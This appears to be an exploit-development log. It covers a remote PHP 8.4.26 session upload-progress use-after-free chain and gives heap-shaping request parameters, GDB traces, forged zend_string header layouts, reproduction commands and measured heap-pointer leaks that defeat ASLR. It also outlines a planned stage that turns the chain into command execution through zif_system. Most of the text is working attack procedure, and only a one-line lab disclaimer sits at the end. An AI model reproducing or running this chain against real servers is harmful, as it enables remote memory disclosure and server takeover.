# Pure-HTTP Chain Without display_errors: Progress and Remaining Calibration

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (`172.16.0.103`, `display_errors=0`, `memory_limit=8M`, one worker)
Constraints: Fully remote; ordinary multipart HTTP only. Target page is `<?php echo "OK\n"; ?>` (no `session_start()`); no target `/proc` reads.

---

## 1. Result (Current Status)

An **OOM-in-cookie primitive that does not rely on warning output** now works with `display_errors=0`:

1. Request A OOMs inside `php_session_send_cookie()`, at the first `zend_string_safe_alloc(3, 32, 0, 0)` in `php_url_encode()` (121B → bin 128).
2. OOM occurs after `PS(send_cookie)=1` but before `PS(send_cookie)=0`. The request bails out, leaving `PS(id)` (a random 32-character id) and `PS(send_cookie)=1` behind.
3. No PHP warning/output is involved; `SG(headers_sent)` remains 0 throughout.
4. On the following B request, pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() → php_session_initialize()` can now get past cleanup of A's stale `PS(mod_data)` and call `php_session_send_cookie()` with the **dangling `PS(id)`** (the `RESET_ID`/`SEND_COOKIE` breakpoints were confirmed).

The remaining step was to reclaim B's stale-id block as a forged `zend_string` header (so `url_encode` reads a controlled large length) while preventing `php_rshutdown_session_globals()` from triggering `zend_mm_panic` when it releases the id. **This step is also complete:** B uses two large fields to lay out the cached id chunk through page 510. The live copy of the second field lands on pages 257–511 and writes a forged header plus an uninitialized tail at the corresponding offset in page 511. `url_encode` reads 4000 bytes; the last 3000 bytes contain bin-64 free-list pointers left in page 511 by A.

Measurements with `display_errors=0`:

~~~text
Set-Cookie: PHPSESSID=MMMM... (1000 M bytes followed by 4000 decoded bytes)
decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000     # no-ASLR
decoded=4000 ptrs=47 chunk_base=0x7f9acd000000     # ASLR enabled
decoded=4000 ptrs=47 chunk_base=0x7f1416e00000     # ASLR enabled
~~~

Success: 3/3 without ASLR and 2/2 with ASLR (all with `display_errors=0` verified). Failed attempts simply missed page 511 and returned a normal 32-byte cookie; they did not crash.

### 1.1 The Target Page Does Not Need session_start

The target page used in this test is:

~~~php
<?php echo "OK\n"; ?>
~~~

It does not call `session_start()`. The chain still works because session initialization is triggered by `session.upload_progress` callbacks before RINIT:

- A: `MULTIPART_EVENT_FILE_START → php_session_rfc1867_update → php_session_initialize()`.
- B: `MULTIPART_EVENT_END → php_session_rfc1867_cleanup → php_session_initialize()`.

Both occur before script execution, so whether the page calls `session_start()` is irrelevant to the vulnerability chain. Measurements on the same no-session page:

- `display_errors=0` forge leak: 4000 bytes / 47 pointers, chunk base `0x7ffff3e00000` (evidence: `logs/nosession_forge_20261021.resp`).
- Earlier `display_errors=1` stage 1 leak: 4096 bytes / 98 pointers, chunk base `0x7ffff5e00000` (evidence: `logs/nosession_classic_leak_20261021.resp`).

---

## 2. Why the Earlier Chain Needed display_errors

Earlier A used a `max_input_vars` warning to set `SG(headers_sent)` to 1, causing `php_session_send_cookie()` to return `FAILURE`:

~~~c
if (SG(headers_sent)) { ... return FAILURE; }   /* send_cookie remains 1 */
~~~

`php_session_reset_id()` returns `FAILURE` → `php_session_initialize()` calls `php_session_abort()` → `ps_close_files()` releases `PS(mod_data)` normally (sets it to NULL). B's `s_open` then sees `mod_data == NULL` and does not touch a stale pointer; B only has to reclaim the stale id block with a raw buffer.

With `display_errors=0`, the warning is not emitted and `headers_sent` is not set, so the “FAILURE + abort” path disappears. OOM must happen directly inside `send_cookie` instead:

- `send_cookie` does not return, so `PS(send_cookie)=1` remains set.
- `php_session_abort()` also does not run, so `PS(mod_data)` becomes dangling.
- B's `s_open` first calls `ps_close_files(stale mod_data)`, creating a new problem.

---

## 3. A: Allocation Details for OOM-in-cookie

The first allocation in `php_session_send_cookie()` (8.4.26) is:

~~~c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
~~~

In `php_url_encode_impl()`:

~~~c
start = zend_string_safe_alloc(3, len, 0, 0);   // len = 32
~~~

Requested size = `24 + 3*32 + 1 = 121` → **bin 128** (one-page run, 32 slots). At the entry to `send_cookie`, both conditions must hold:

- `heap->free_slot[11] == NULL` (bin 128 is empty).
- The sum of `free_pages` across all four chunks is 0.

This allocation then calls `zend_mm_alloc_small_slow(heap, 11)` → `zend_mm_alloc_pages(1)` → no free page → `zend_mm_safe_error` → bailout.

### 3.1 Request Shape

`tools/send_a_oom5.py`; measured stable parameters:

~~~text
F=0  S=62  NB=235  BL=15000  X=208  K=0  KL=4000  FL=103
~~~

- **S=62 single-name fields:** Name length 103B (`zend_string` = 128 → bin 128), value length 8B. Each field's filtered value copy uses bin 40; the name contributes one live bin-128 slot. The file part (103B field name + 103B filename) adds two more live bin-128 slots. Total `62 + 2 = 64 = 2×32`, exactly emptying `free_slot[11]`. (A field with a 103B value contributes three bin-128 allocations, so the value must be 8B here.)
- **`NB×BL = 235 × 15000B`:** large fields fill memory. Each value has two live copies (`IF_G(post_array)` + `$_POST`), each `25+15000` → 4 pages, or 8 pages per field.
- **`X=208` values of 231B:** bin 256 (16 slots/page); each field has two live slots + one temporary raw slot. Every eight fields trigger a new 256B run (one page), allowing page-level trimming.

### 3.2 GDB Evidence

`logs/oomcookie_A_20261021.log`:

~~~text
SEND_COOKIE id=0x7ffff3fff000 len=32 size=8253840 real=8388608 limit=8388608
            free_pages=0 chunks=[0,0,0,0] fs7=.../63 fs9=0/0 fs11=0x0/0
MM_SAFE_ERROR real=8388608 limit=8388608 size=8253968
PS_AT_OOM id=0x7ffff3fff000 len=32 send_cookie=1
#3 zend_string_safe_alloc (persistent=false, l=0, m=32, n=3)
#4 php_url_encode_impl (raw=false, len=32, s=0x7ffff3fff018 "...")
#5 php_url_encode
#6 php_session_send_cookie
#7 php_session_reset_id
#8 php_session_initialize
#9 php_session_rfc1867_update
~~~

Key points:

- `real=8M=limit`: four chunks are already mapped; no more can be mmap'd.
- `free_pages=0` and `fs11=0`: the bin-128 run needed by `url_encode` has nowhere to go.
- OOM occurs exactly in `php_url_encode_impl`, not during parsing or the large fields.
- `PS_AT_OOM send_cookie=1`: `PS(send_cookie)` was not cleared, and `PS(id)` still points to the random 32-character id (`id=0x7ffff3fff000`, page 511 in chunk `0x7ffff3e00000`).

A responds with `500 Internal Server Error` and an empty body (`display_errors=0` emits nothing); the worker remains alive.

### 3.3 Calibration Method

`tools/trial_bins.sh` restarts Apache each time (`setarch -R`), attaches GDB, sends A, and prints `SEND_COOKIE` / `MM_SAFE_ERROR`. Changing X by ±1 moves `free_pages` between 0 and non-zero; `fs11` is determined only by S (`S ≡ 30 mod 32`). With `S=62`, values X=206..212 all hit `free_pages=0, fs11=0`.

---

## 4. B: Get Past the Dangling PS(mod_data)

### 4.1 Crash Mechanism

B's `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() → php_session_initialize()`:

~~~c
PS(mod)->s_open(&PS(mod_data), ...)          /* ps_open_files */
    data = ecalloc(1, sizeof(ps_files));     /* 40B -> bin 40 */
    data->basedir = zend_string_init("/tmp");
    if (PS_GET_MOD_DATA()) ps_close_files(mod_data);   /* <- dangling pointer */
    PS_SET_MOD_DATA(data);
~~~

A's `PS(mod_data)` is a `ps_files*` from `ecalloc(1,40)`, measured at `0x7ffff5e7f500` (main chunk + `0x7f500`, slot 32 in bin 40). A's shutdown did not run session RSHUTDOWN, so this pointer is dangling.

If the address is not a valid block in B, `efree(data)` in `ps_close_files()` triggers `zend_mm_panic("zend_mm_heap corrupted")` during the `chunk->heap` check.

### 4.2 Workaround: Make That Page an SRUN Page in B

For an SRUN page, `zend_mm_free_heap()` **does not check block alignment**. It only checks `chunk->heap == heap`, then puts the pointer directly into the freelist with `zend_mm_free_small(heap, ptr, bin)`. Therefore, if B turns the page containing `0x7ffff5e7f500` (main chunk page 127) into a small-bin run page, `efree(data)` will not panic.

Measured B shape:

~~~text
N=160 fields, each with a 231B value (bin 256)
~~~

At B's `ps_open_files` breakpoint:

~~~text
new=0x7ffff5e64028 pg=100 info=0x80000004
old=0x7ffff5e7f500 pg=127 chunk_heap=0x7ffff5e00040 match=1 info=0x8000000f
last_key=0x7ffff5e7f600 basedir=0x7ffff5e022c0 fd=-1
~~~

- Page 127 is SRUN bin 15 (256B); slot 5 is unallocated (12 empty slots remain in the run).
- `last_key` is the next free slot in the same run, so it is safe.
- `basedir` still points to A's `/tmp` zend_string (safe; its bin-32 page is SRUN).
- `fd=-1`.

`ps_close_files` therefore returns, and `s_open` sets a new valid `mod_data`. Initialization sees that the stale id's first byte is nonzero (A's random id is intact), skips ID creation, and calls `php_session_reset_id()` directly:

~~~text
RESET_ID id=0x7ffff3fff000 len=32 send_cookie=1
SEND_COOKIE id=0x7ffff3fff000 len=32 ... free_pages=370 ...
~~~

**B has now called `php_session_send_cookie()` with the stale id** (A's id and `send_cookie=1` remain). This replaces the earlier chain's dependence on `display_errors`.

### 4.3 Remaining Crash: RSHUTDOWN Releases the Stale ID

After cleanup, `MULTIPART_EVENT_END` unconditionally runs:

~~~c
php_rshutdown_session_globals();
    ...
    if (PS(id)) { zend_string_release_ex(PS(id), 0); PS(id) = NULL; }
~~~

The stale id is at page 511 (page start address `0x7ffff3fff000`) of chunk `0x7ffff3e00000`. In B, that chunk is only a **cached chunk**:

~~~text
RSHUT_ID id=0x7ffff3fff000 base=0x7ffff3e00000 pg=511
          chunk_heap=0x0 match=0 info=0x0
          bytes=01000000160000000000000000000000   # refcount=1
~~~

`chunk_heap=0` fails the `chunk->heap == heap` check in `zend_mm_free_heap` and panics. A's id zend_string still has `refcount=1`, so release attempts to efree it.

---

## 5. B Forge (Implemented)

### 5.1 Goal

Before `send_cookie`, reclaim the stale-id block (`0x7ffff3e00000 + 0x1ff000`, page 511 slot 0 in that chunk) with controlled contents so that:

- `PS(id)+0x10` (len) = 4000.
- At rshutdown, `PS(id)+0x00` is not refcount=1 (after free, it contains the freelist next pointer).
- `url_encode` reads 4000 bytes from `PS(id)+0x18`: the first 1000 bytes are padding, and the remaining 3000 contain bin-64 freelist pointers left at the end of page 511 by A.
- The `3*len` allocation in `url_encode` (12000B → 3 pages) succeeds in B.

### 5.2 Lay Out Pages with Two Fields

B body order in `send_b_open.py`:

~~~text
160 × 231B values (bin-256 run; make main chunk page 127 a partial run with 12 free slots)
1 × 1,048,551B value (BB1, zend_string = 256 pages)
1 × 1,041,384B value (BF, zend_string = 255 pages, forged payload)
PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
(no file part; goes through pre-RINIT END cleanup)
~~~

Measured allocation sequence:

1. BB1's raw buffer (256 pages) first lands in the main chunk's free tail, then is freed.
2. One of BB1's two live copies claims the cached id chunk via `chunk_init` and occupies pages 1–256.
3. BF's raw buffer (255 pages) reuses the main chunk's free tail, then is freed.
4. BF's live copy lands on pages 257–511 of the id chunk (exact Best-Fit match, since that range is 255 pages), overwriting page 511.

Thus `PS(id)` at page 511 is inside the data area of a **live zend_string**, and later allocations do not overwrite it.

### 5.3 Forged Header Layout

BF's allocation begins at `S = chunk + 257*4096`; page 511 is at `S + 254*4096`. zend_string data starts at `S+0x18`, so the forged header offset within the value is:

~~~text
D = (510 - 256) * 4096 = 254 * 4096 = 1,040,384
gc    at D-24 : 0x4141414141414141   (refcount != 1 at rshutdown)
h     at D-16 : 0
len   at D-8  : 4000
data  at D    : 'M' * 1000, then the value ends (L2 = D+1000)
~~~

BF allocation size `25 + L2 = 1,041,409` → 255 pages, exactly aligned with pages 257–511. The value writes only 1000 bytes inside page 511; the following ~3000 bytes are uninitialized and retain the bin-64 freelist pointers left there by A.

### 5.4 Measurements

`SEND_COOKIE id=0x7ffff3fff000 len=4000`; `RSHUT_ID ... bytes=41414141...` (match=1, no panic); response `200 OK`; 4000 decoded bytes in `Set-Cookie`:

~~~text
logs/oomcookie_leak_noaslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000

logs/oomcookie_leak_aslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7f9acd000000
  (another ASLR run: 0x7f1416e00000)
~~~

All 47 pointers are within the chunk (for example, `0x7ffff3fff400/…f480/…f4c0`); the 2 MB-aligned mode gives the chunk base.

### 5.5 Reproduction

~~~bash
# no-ASLR
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR enabled
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
~~~

### 5.6 Stability

- 3/3 without ASLR; 2/2 with ASLR (both with `display_errors=0`).
- A failed attempt means page 511 was not overwritten, `len` remained 32, and a normal 32-byte cookie was returned without a crash; retry.
- Uses the fresh-worker + GDB attach check in `trial_ab.sh` (retries when breakpoints are pending).

### 5.7 Verified Checklist

- [x] With `display_errors=0`, A OOMs in `php_url_encode` with `send_cookie=1`.
- [x] A leaves `PS(id)` dangling across requests.
- [x] B's `ps_close_files(stale mod_data)` does not panic (SRUN page + aligned empty slot).
- [x] B calls `send_cookie` with the stale id (`RESET_ID`/`SEND_COOKIE` hit).
- [x] B retrieves the cached chunk (`chunk_heap != 0`), preventing rshutdown panic.
- [x] Two-field page layout + BF live copy overwrite page 511 and forge `len=4000`.
- [x] `Set-Cookie` contains 47 in-chunk pointers, allowing the chunk base to be recovered with ASLR enabled.

## 6. Remaining Work (Stages 2/3)

### 6.1 Exact Stage 2 Constraints with display_errors=0

Stage 2 needs to read a real HashTable:

~~~text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
PS(id)+0x18 = HT+0x28 = nNextFreeElement                -> data qword 1
PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> data qword 2
~~~

Therefore either `PS(id) = HT+0x10`, or the page-511 forge must enlarge len so the read window reaches a later real HashTable.

In the current chain 0, `PS(id)` is on the **last page** (page 511, `chunk+0x1ff000`) of the cached id chunk. The read from `PS(id)+0x18` to the page end is at most about 0xFE8 bytes; it **cannot leave this chunk** because the following address is unmapped. Therefore:

1. A real HashTable must be on page 511.
2. Page 511 can hold only **one bin run**: either a bin-56 run (56B HashTable structures) or the large object carrying the forge, not both.
3. If page 511 is a bin-56 run, slot 0 holds a freed 55B raw buffer (+0x10 = forged len, +0x18 = data), and slot 1 holds a real HashTable (pDestructor at page+0x68); the read window then covers the target.
4. This one-page run will land on page 511 of the id chunk only when the **main chunk has no free pages**. B currently has 370 free pages in the main chunk, so a one-page run is allocated there first.

### 6.2 Experiments So Far

- **Late large field:** Insert a 50/100-page field before the X trimmer, then try to leave a hole in the main chunk after its raw buffer is freed. NB=235 OOMs directly; NB=215/208 reaches `send_cookie`, but the id remains in chunk 0x3e/0x3d and `url_encode` does not OOM (`free_pages > 0`). The two live copies of the raw field keep steady-state memory full; freeing its raw buffer does not create the only available last page.
- **513th arData resize:** Moving the 513th insert to the end of X OOMs because it needs 10 contiguous pages. Moving it into the middle of the large fields lets later 4-page copies of large fields consume the old 4-page arData hole exactly.
- **Conclusion:** Stage 2 needs explicit three-part heap shaping: “fill the main chunk with live copies + leave page 511 in the id chunk + place the bin-56 run on page 511.” This is calibration work, not a one-parameter adjustment.

### 6.3 New Primitive (Evening 2026-10-21): Move the Stale ID Inside a Live String

The path in 5.x leaves `PS(id)` on page 511 of the cached chunk. A different path, **inside the main chunk and without a page-511 forge**, has now produced a measured 16 KB out-of-bounds read:

1. In addition to `WARM_LEN=60`, A adds a field with a 32-byte value (`W64_LEN=32`, stored zend_string = 24+32+1 = 57 → bin-64). It first occupies slot 0 of the bin-64 run on page 128; the 32-byte id from `php_session_create_id` lands in **slot 1**: `PS(id) = chunk + 0x80080` (page 128 + 0x80).
2. B still uses N=160 fields with 231-byte values; page 128 is a bin-256 run and slot 0 holds a **live** 231-byte string. `PS(id)=page+0x80` lands exactly in that string's data:
   - The id length is at `PS(id)+0x10 = page+0x90 = value[0x78]`.
   - Id data starts at `PS(id)+0x18 = page+0x98 = value[0x80]`.
   Write `0x4000` at offset 0x78 of **every** value string and a nonzero byte (`V`) at offset 0x80. B's `send_cookie` then URL-encodes 0x4000 bytes. The header check (`ZSTR_VAL(id)[0] != 0`) also passes because we wrote `V` there.
3. No free-list or forge needs to land in the stale block, and no cached chunk is needed.

Measured parameters/results (no-ASLR, `display_errors=0`):

~~~bash
# A: WARM=60 puts id in the main chunk; W64=32 moves it from page+0x00 to page+0x80
WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
#   MM_SAFE_ERROR still in php_url_encode; PS_AT_OOM send_cookie=1

# B: N=160 values of 231B; forge len=0x4000 at value offset 0x78
WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
#   Set-Cookie PHPSESSID=... (20,616 characters, 16,392 decoded bytes)
~~~

Response archive: `logs/oomcookie_shift_leak_20261021.resp`. The decoded 16 KB contains bin-256 string slots starting at page 128 (each with `gc=0x…0001, h=0, len=0xe7, data='V'*231`). A **controlled-length heap read spanning slots/blocks** is now confirmed, but the window contains only field strings so far, not libphp code pointers.

### 6.4 Two Remaining Stage 2 Constraints with the New Primitive

To turn the 16 KB window into a libphp leak, it must include a **real HashTable structure** (`pDestructor = libphp+0x613c50` at `HT+0x30`). The alignment is:

~~~text
PS(id) = HT + 0x10
  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
  id+0x18 = HT+0x28 = nNextFreeElement                -> data[0]
  id+0x20 = HT+0x30 = pDestructor                     -> data[8]
~~~

A's current `PS(id)=page128+0x80` equals **slot 2 + 0x10** in a bin-56 run (56B slot stride 0x38, slot 2=0x70). If B places a bin-56 run on page 128 and slot 2 is an array HashTable with `nTableSize>=16`, it can directly leak `pDestructor`. Two blockers were measured:

1. **bin-56 free-list head:** At B's `SESSION_INIT`, the bin-6 (56B) free chain has **64 slots** (one full empty page, from A's request shutdown). Those 64 slots must be consumed before the 65th HashTable creates a new run. But array-field key/value strings (bins 32/40/48) create their own runs first and claim page 128 (measured page 128 becomes bin-3/bin-4; the id reads garbage/len=1).
2. **Stale `ps_files` on page 127:** A with `display_errors=0` OOMs inside `php_url_encode`, so `php_session_abort()` does not run and `PS(mod_data)` remains a stale ps_files at page 127 + 0x500. B's END cleanup calls `ps_close_files` before `send_cookie`. B must reallocate page 127 as a **suitable bin's SRUN page**, and slot +0x500 must not be a live string (otherwise `last_key/basedir` reads a zend_string header and `zend_string_release` crashes). The N=160 shape from 5.x makes page 127 bin-256 with slot 5 empty. Adding arrays/trailing fields makes page 127 free/bin-32/bin-40 and triggers `zend_mm_panic` or SIGSEGV. No field sequence has yet satisfied both “page 127 slot 5 is safe” and “page 128 bin-56 run slot 2 is a HashTable.”

These are pure stage-2 calibration issues. After stage 2 provides the libphp base, the stage-3 `zif_system` endpoint (`pDestructor=zif_system`, fake execute_data) can reuse `send_b_zif.py`; only the fake HT/fake-reference addresses need recalibration for the new shape.

### 6.5 Stage 3

The `zif_system` endpoint (`pDestructor=zif_system`, fake execute_data) does not need libc. Once stage 2 yields the libphp base, reuse `send_b_zif.py`'s payload and recalibrate the fake HT address and fake-reference landing point for chain 0's A/B shape.

## 7. Files and Commands

| File | Purpose |
|---|---|
| `tools/send_a_oom5.py` | A: S 103B-name/8B-value fields + NB large fields + X 231B-value fields + file part; optional `AQ_N/AQ_LEN` GET padding, `WARM_LEN`, and `W64_LEN` (bin-64 shift) |
| `tools/send_b_open.py` | B: N 231B-value fields + PHPSESSID + PROGRESS, no file part; `BB1_LEN` page layout, `BF_P1/BF_READ` forge, `BVAL_OFF/BVAL_LEN` forged len inside value, `BUNIQ/DUP_*` unique values/duplicate names, `NEST_*` nested arrays, `TAIL231/232` trailing fields; optional Cookie/Header/GET padding |
| `tools/trial_bins.sh` | A-only calibration (restart + GDB + send A) |
| `tools/trial_ab.sh` | Fresh worker + GDB breakpoint parsing, then A/B; omits `setarch -R` when `ASLR_ON=1` |
| `tools/g_bins.gdb` | GDB probes for `SEND_COOKIE`, `OPEN_FILES`, `RESET_ID`, `RSHUT_ID`, `MM_SAFE_ERROR`, chunk/page maps, cached chunks, and empty slots in bin 15 |
| `logs/oomcookie_A_20261021.log` | GDB evidence for A (exact OOM location) |
| `logs/oomcookie_AB_20261021.log` | A+B evidence (past mod_data, B send_cookie, and rshutdown panic in the old shape) |
| `logs/oomcookie_forge_aslr_20261021.gdb.log` | GDB trace of successful forge (len=4000, RSHUT bytes=4141…) |
| `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR leak response (decoded 4000, 47 pointers, base 0x7ffff3e00000) |
| `logs/oomcookie_leak_aslr_20261021.resp` | ASLR leak response (base 0x7f9acd000000) |
| `logs/oomcookie_leak_decode_20261021.txt` | Decoded result summary |
| `logs/oomcookie_shift_leak_20261021.resp` | 16 KB leak response from the shifted-id primitive (len=16384, 20,616 characters) |

Reproduction on the target host in `~/php2shell-work`:

~~~bash
# A only: confirm OOM-in-cookie
./trial_bins.sh 0 62 235 15000 208 0 4000 103

# A + B (past mod_data; page 511 not yet overwritten)
BN=160 BVL=231 ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# A + B forge (chunk leak)
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR enabled
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
~~~

Expected key GDB output:

~~~text
SEND_COOKIE id=0x... len=32 free_pages=0 fs11=0x0/0
MM_SAFE_ERROR ... zend_string_safe_alloc(l=0, m=32, n=3) <- php_url_encode
PS_AT_OOM ... send_cookie=1
SESSION_INIT (B) id=0x7ffff3fff000 len=32 send_cookie=1
OPEN_FILES old=... info=0x8000000f last_key=... basedir=... fd=-1
RESET_ID id=0x7ffff3fff000 send_cookie=1
SEND_COOKIE (B) id=0x7ffff3fff000 len=4000
RSHUT_ID ... bytes=4141414141414141... match=1
~~~

---

## 8. Disclaimer

For vulnerability research and reproduction in authorized environments only. Request shape, bin sequence, and offsets depend on this lab's PHP 8.4.26 build, 8M memory_limit, files save handler, and single-worker prefork configuration; recalibrate after changing the build or configuration.
